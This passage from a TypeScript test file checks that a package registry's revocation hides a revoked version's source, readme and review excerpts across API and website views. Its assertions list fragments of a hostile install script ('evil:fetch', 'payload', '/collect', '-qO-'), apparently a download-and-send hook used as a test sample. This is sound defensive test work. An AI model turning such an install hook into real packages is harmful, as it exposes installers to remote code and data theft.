    await publish(reg, dave, { name, version: "1.0.0", license: "MIT", main: "index.js", scripts }, { "index.js": "module.exports = 1;\n" });
    // before the revoke the evidence quotes the scripts, as it should
    expect((await evidenceOf(name)).join("\n")).toContain(SOURCE);
    expect(dig((await revoke(dave, name)).body, "status")).toBe("revoked");

    for (const answer of [await score(name), await pkg(name), await getJson(`${reg.url}${name}`)]) {
      expect(answer.status).toBe(200);
      expect(JSON.stringify(answer.body)).not.toContain(SOURCE);
      // the scripts' own words: their names and paths (a signal's label is apm's wording and stays)

      for (const quoted of ["evil:fetch", "payload", "/collect", "-qO-"]) expect(JSON.stringify(answer.body)).not.toContain(quoted);
    }

    expect(SignalIds.parse((await score(name)).body).signals.map((x) => x.id)).toEqual(expect.arrayContaining(["install-script", "install-download", "revoked"]));
  });

  // review finding 2: the readme belongs to the publish that wrote it, not to the newest publish
  test("revoking the version whose publish wrote the readme hides it, even when a later publish had none", async () => {
    const erin = await addUser(reg, "erin-readme", PASSWORD);
    const name = "ai-review-readme-owner";
    const base = { name, license: "MIT", main: "index.js" };

    await publish(reg, erin, { ...base, version: "1.0.0", readme: `# v1\n\nReports to ${SOURCE}.` }, { "index.js": "module.exports = 1;\n" });
    clock += 60_000;
    await publish(reg, erin, { ...base, version: "1.1.0" }, { "index.js": "module.exports = 2;\n" });
    // 1.1.0 had no readme, so 1.0.0's is still shown
    const before = await pkg(name);

    expect(dig(before.body, "readme")).toContain(SOURCE);
    expect(dig((await revoke(erin, name, "1.0.0")).body, "status")).toBe("revoked");
    const after = await pkg(name);

    expect(dig(after.body, "readme")).toBe("");
    expect(JSON.stringify((await getJson(`${reg.url}${name}`)).body)).not.toContain(SOURCE);
    // 1.1.0 is still there and still served
    expect(dig(after.body, "latest")).toBe("1.1.0");
    // the answer says whose readme it shows: 1.0.0's before the revoke, none after
    expect(dig(before.body, "readmeVersion")).toBe("1.0.0");
    expect(dig(after.body, "readmeVersion")).toBeNull();
  });

  // The acceptance test for revocation: the website's own data layer, bundled as a Worker and run in workerd through
  // Miniflare, reads every view of a version from the real registry Worker until each is warm, then the version is
  // revoked, and the very next read of every view carries none of its source.
  test("every view the website warmed shows no source on the first request after a revoke", async () => {
    const frank = await addUser(reg, "frank-views", PASSWORD);
    const name = "ai-review-every-view";
    const readmeFile = `# every view\n\nThe tarball readme names ${SOURCE}.\n`;

    await publish(reg, frank, { ...manifest(name), readme: `# every view\n\nThe packument readme names ${SOURCE}.` }, { ...files, "README.md": readmeFile });

    for (let n = await runOnce(reviewer(), 4); n > 0; n = await runOnce(reviewer(), 4)) await Bun.sleep(0);
    const queued = Queue.parse((await adminBrowser.json("-/apm/v1/review-admin/queue")).body).pending.find((p) => p.name === name);
    const decision = { name, version: "1.0.0", digest: queued?.digest, decision: "confirm", note: "Checked by hand.", code: totp(adminSecret) };

    expect((await adminBrowser.json("-/apm/v1/review-admin/decide", { method: "POST", body: decision })).status).toBe(200);

    const out = mkdtempSync(join(tmpdir(), "apm-revoke-views-"));

    const built = await Bun.build({
      entrypoints: [join(import.meta.dir, "../../apps/web/lib/revoke-views.workerd-entry.ts")],
      outdir: out,
      target: "browser",
      format: "esm",
      // react-server: lib/registry.ts's server-only marker resolves to its empty module, as in the deployed build
      conditions: ["react-server", "workerd", "worker", "edge-light"],
      define: { "process.env.NODE_ENV": '"production"', "process.env.APM_REGISTRY": JSON.stringify(reg.url) },
    });

    const script = built.outputs[0]?.path;

    if (!built.success || !script) throw new AggregateError(built.logs, "bundling the website views Worker failed");
    const site = new Miniflare({ modules: [{ type: "ESModule", path: script }], modulesRoot: out, compatibilityDate: "2026-07-30", compatibilityFlags: ["nodejs_compat"] });

    try {
      const views = async (): Promise<z.infer<typeof Views>> => {
        const res = await site.dispatchFetch("http://site.test/", { method: "POST", body: JSON.stringify({ name, version: "1.0.0", path: "index.js", line: 2 }) });

        return Views.parse(await res.json());
      };

      // warm: every view twice, so whatever the site keeps is kept, and each quotes the package before the revoke
      await views();
      const warm = await views();

      for (const view of QUOTING) expect(JSON.stringify(warm[view]), view).toContain(SOURCE);
      expect(dig(warm, "apiReadme", "cacheControl")).toBe("private, no-store");

      expect(dig((await revoke(frank, name)).body, "status")).toBe("revoked");
      const after = await views();

      expect(JSON.stringify(after)).not.toContain(SOURCE);
      // the files are refused by the registry; the answers that only say what was found still come back

      for (const view of ["file", "excerpt", "tarballReadme"]) expect(dig(after, view, "reason", "status"), view).toBe(410);
      expect(dig(after, "review", "value", "redacted")).toBe(true);
      expect(dig(after, "review", "value", "review", "findings", 0, "line")).toBe(2);
      expect(dig(after, "score", "value", "redacted")).toBe(true);
      expect(dig(after, "package", "value", "readme")).toBe("");
      // its only version is revoked, so the package has no latest version to score
      expect(dig(after, "package", "value", "latest")).toBeNull();
      expect(dig(after, "package", "value", "score")).toBeNull();
      expect(dig(after, "apiReadme", "body")).toBe("");
      expect(dig(after, "apiReadme", "cacheControl")).toBe("private, no-store");
    } finally {
      await site.dispose();
      rmSync(out, { recursive: true, force: true });
    }
  }, 60_000);
});
